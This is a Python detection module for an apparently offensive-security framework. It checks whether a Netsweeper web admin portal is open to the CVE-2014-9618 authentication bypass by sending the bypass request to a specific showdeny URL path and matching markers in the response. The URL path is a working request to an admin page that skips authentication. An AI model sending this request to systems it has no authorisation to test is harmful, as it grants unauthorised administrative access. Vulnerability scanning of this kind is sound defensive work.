#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The Client Filter Admin portal in Netsweeper before 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Netsweeper - Authentication Bypass Detection',
        'description': 'The Client Filter Admin portal in Netsweeper before 3.1.10, 4.0.x before 4.0.9, and 4.1.x before 4.1.2 allows remote attackers to bypass authentication and subsequently create arbitrary profiles via a showdeny action to the default URL.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2014', 'netsweeper', 'auth-bypass', 'packetstorm', 'edb', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/download/133034/netsweeper-issues.tgz',
            'https://nvd.nist.gov/vuln/detail/CVE-2014-9618',
            'https://www.exploit-db.com/exploits/37933/',
            'http://packetstormsecurity.com/files/133034/Netsweeper-Bypass-XSS-Redirection-SQL-Injection-Execution.html',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2014-9618',
    }

    def run(self):
        r = self.http_request(method="GET", path='/webadmin/clientlogin/?srid=&action=showdeny&url=', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('name=formtag action="../clientlogin/?srid=&action=showdeny&url="', 'placeholder="Profile Manager">', '<title>Netsweeper WebAdmin</title>',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='critical',
                reason="Netsweeper - Authentication Bypass detected",
                path='/webadmin/clientlogin/?srid=&action=showdeny&url=',
            )
            return True
        return False

